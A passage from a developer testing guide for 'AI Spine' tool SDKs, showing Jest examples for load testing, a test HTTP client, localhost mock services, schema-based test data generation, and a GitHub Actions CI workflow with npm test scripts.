    const workflowMetrics = workflow.getMetrics();
    expect(workflowMetrics.retries).toBeGreaterThan(0);
    expect(workflowMetrics.fallbacks).toBeGreaterThan(0);
  });

  test('AI Agent: Performance Under Load', async () => {
    // Test AI agent performance with concurrent operations

    const concurrentWorkflows = 20;
    const workflowPromises = Array(concurrentWorkflows).fill(0).map(async (_, i) => {
      const workflow = e2eRunner.createWorkflow(`concurrent-workflow-${i}`);

      return workflow.step('concurrent-operation', () => {
        return testEnvironment.callTool('weather-tool', {
          input_data: { city: `City${i}` },
          config: { apiKey: 'test-weather-key' }
        });
      });
    });

    const startTime = Date.now();
    const results = await Promise.all(workflowPromises);
    const totalTime = Date.now() - startTime;

    expect(results).toHaveLength(concurrentWorkflows);
    results.forEach((result, i) => {
      expect(result.status).toBe('success');
      expect(result.data.city).toBe(`City${i}`);
    });

    expect(totalTime).toBeLessThan(15000); // Should complete within 15s
  });
});
```

---

## Testing Utilities

### AISpineTestClient

HTTP client for testing tool APIs:

```typescript
import { AISpineTestClient } from '@ai-spine/tools-testing';

describe('Test Client Usage', () => {
  let client: AISpineTestClient;

  beforeEach(() => {
    client = new AISpineTestClient({
      baseUrl: 'http://localhost:3000',
      apiKey: 'test-api-key',
      timeout: 5000,
      retries: 3
    });
  });

  test('should execute tool requests', async () => {
    const response = await client.execute({
      input_data: { query: 'test' },
      config: { option: 'value' }
    });

    expect(response).toHaveProperty('status');
    expect(response).toHaveProperty('data');
  });

  test('should handle health checks', async () => {
    const health = await client.getHealth();
    
    expect(health).toHaveProperty('status');
    expect(health).toHaveProperty('version');
    expect(health).toHaveProperty('uptime_seconds');
  });

  test('should retrieve schema information', async () => {
    const schema = await client.getSchema();
    
    expect(schema).toHaveProperty('metadata');
    expect(schema).toHaveProperty('schema');
    expect(schema).toHaveProperty('openapi');
  });

  test('should handle errors gracefully', async () => {
    await expect(client.execute({
      input_data: { invalid: 'data' }
    })).rejects.toThrow();
  });
});
```

### Mock Managers

Create and manage mocks for external dependencies:

```typescript
import { MockManager, createMockService } from '@ai-spine/tools-testing';

describe('Mock Manager Usage', () => {
  let mockManager: MockManager;

  beforeEach(() => {
    mockManager = new MockManager();
  });

  afterEach(async () => {
    await mockManager.cleanup();
  });

  test('should mock external API responses', async () => {
    const mockWeatherAPI = await mockManager.createMockService({
      name: 'weather-api',
      port: 8080,
      responses: {
        '/weather': {
          method: 'GET',
          response: {
            city: 'Madrid',
            temperature: 22,
            description: 'sunny'
          }
        }
      }
    });

    // Test tool that uses the mocked API
    const tool = createTool({
      // ... tool definition that calls weather API
      execute: async (input, config, context) => {
        const response = await fetch('http://localhost:8080/weather');
        const data = await response.json();
        return { status: 'success', data };
      }
    });

    const result = await testTool(tool, {
      input: {},
      config: {}
    });

    expect(result.status).toBe('success');
    expect(result.data.city).toBe('Madrid');
    expect(mockWeatherAPI.getRequestCount()).toBe(1);
  });

  test('should simulate network failures', async () => {
    const mockService = await mockManager.createMockService({
      name: 'unreliable-service',
      port: 8081,
      responses: {
        '/data': {
          method: 'GET',
          failureRate: 0.5, // 50% failure rate
          latency: { min: 100, max: 500 }
        }
      }
    });

    let successCount = 0;
    let errorCount = 0;

    for (let i = 0; i < 20; i++) {
      try {
        await fetch('http://localhost:8081/data');
        successCount++;
      } catch (error) {
        errorCount++;
      }
    }

    expect(successCount).toBeGreaterThan(0);
    expect(errorCount).toBeGreaterThan(0);
    expect(successCount + errorCount).toBe(20);
  });
});
```

---

## Test Data Generation

### Schema-Based Data Generation

Generate test data from tool schemas:

```typescript
import { generateTestData, TestDataGenerator } from '@ai-spine/tools-testing';

describe('Test Data Generation', () => {
  let dataGenerator: TestDataGenerator;

  beforeEach(() => {
    dataGenerator = new TestDataGenerator();
  });

  test('should generate valid test data from schema', () => {
    const schema = {
      input: {
        email: emailField().required(),
        age: numberField().optional().min(18).max(100).integer(),
        tags: arrayField(stringField().required()).minItems(1).maxItems(5)
      }
    };

    const testData = dataGenerator.generate(schema.input);

    expect(testData.email).toMatch(/^[^\s@]+@[^\s@]+\.[^\s@]+$/);
    expect(testData.age).toBeGreaterThanOrEqual(18);
    expect(testData.age).toBeLessThanOrEqual(100);
    expect(Array.isArray(testData.tags)).toBe(true);
    expect(testData.tags.length).toBeGreaterThanOrEqual(1);
    expect(testData.tags.length).toBeLessThanOrEqual(5);
  });

  test('should generate edge case data', () => {
    const schema = {
      input: {
        score: numberField().required().min(0).max(100)
      }
    };

    const edgeCases = dataGenerator.generateEdgeCases(schema.input);

    expect(edgeCases).toContainEqual(
      expect.objectContaining({ score: 0 })
    );
    expect(edgeCases).toContainEqual(
      expect.objectContaining({ score: 100 })
    );
  });

  test('should generate invalid data for negative testing', () => {
    const schema = {
      input: {
        email: emailField().required(),
        count: numberField().required().min(1).integer()
      }
    };

    const invalidData = dataGenerator.generateInvalidData(schema.input);

    // Should generate various invalid combinations
    expect(invalidData.length).toBeGreaterThan(0);
    
    const hasInvalidEmail = invalidData.some(data => 
      !data.email || !data.email.includes('@')
    );
    const hasInvalidCount = invalidData.some(data => 
      data.count < 1 || !Number.isInteger(data.count)
    );

    expect(hasInvalidEmail || hasInvalidCount).toBe(true);
  });
});
```

---

## CI/CD Integration

### GitHub Actions Testing

Integrate testing into CI/CD pipelines:

```yaml
# .github/workflows/test.yml
name: Test AI Spine Tools

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        node-version: [18.x, 20.x]
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run unit tests
        run: npm run test:unit
      
      - name: Upload coverage
        uses: codecov/codecov-action@v3
        with:
          file: ./coverage/lcov.info

  integration-tests:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_DB: test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432
      
      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20.x'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: postgresql://postgres:test@localhost:5432/test_db
          REDIS_URL: redis://localhost:6379

  security-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20.x'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run security tests
        run: npm run test:security
      
      - name: Run security audit
        run: npm audit --audit-level high

  performance-tests:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20.x'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run performance tests
        run: npm run test:performance
      
      - name: Performance regression check
        uses: benchmark-action/github-action-benchmark@v1
        with:
          tool: 'benchmarkjs'
          output-file-path: performance-results.json
          fail-on-alert: true
          alert-threshold: '120%'
```

### Test Scripts Configuration

```json
{
  "scripts": {
    "test": "npm run test:unit && npm run test:integration",
    "test:unit": "jest --config jest.unit.config.js",
    "test:integration": "jest --config jest.integration.config.js",
    "test:e2e": "jest --config jest.e2e.config.js",
    "test:security": "jest --config jest.security.config.js",
    "test:performance": "jest --config jest.performance.config.js",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:ci": "jest --ci --coverage --watchAll=false"
  }
}
```

This comprehensive testing guide covers all aspects of testing AI Spine tools. Remember to:

1. **Test at multiple levels** - Unit, integration, and E2E
2. **Use appropriate test doubles** - Mocks, stubs, and fakes
3. **Generate realistic test data** - Based on your schemas
4. **Test security vulnerabilities** - Input validation and auth
5. **Monitor performance** - Load testing and resource usage
6. **Automate in CI/CD** - Continuous testing and quality gates

For more information, see:
- [Security Implementation](./security.md) - Security testing approaches
- [Error Handling](./error-handling.md) - Testing error scenarios
- [Performance Optimization](./performance.md) - Performance testing techniques